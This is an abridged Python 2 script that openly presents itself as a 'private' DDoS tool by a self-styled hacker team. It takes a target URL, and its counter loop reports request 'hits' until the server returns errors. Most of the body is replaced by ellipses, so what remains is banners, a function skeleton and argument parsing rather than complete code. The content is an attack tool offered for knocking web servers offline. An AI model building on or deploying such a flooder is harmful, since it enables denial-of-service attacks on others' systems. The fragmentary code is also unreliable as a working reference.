...
def usage():
	print '---------------------------------------------------'
	print 'Pra usar python song.py <url>'
	print 'Songg Ddoser By LowWalker NIGHT GHOST '
	print "\a"
print \
"""                        .
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print '~>SONG DOSER HTTP HITTING FULL<~'
 			print '[+]~~>  Hits Launcheds   <~~[+] '
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+500<request_counter) & (previous<>request_counter):
				print "%d Song Up" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -Song Finish"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "PYTHON MUSIC.PY POWERFULL DDOS PRIVATR BY NIGHTGHOST TEAM HACKERS"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
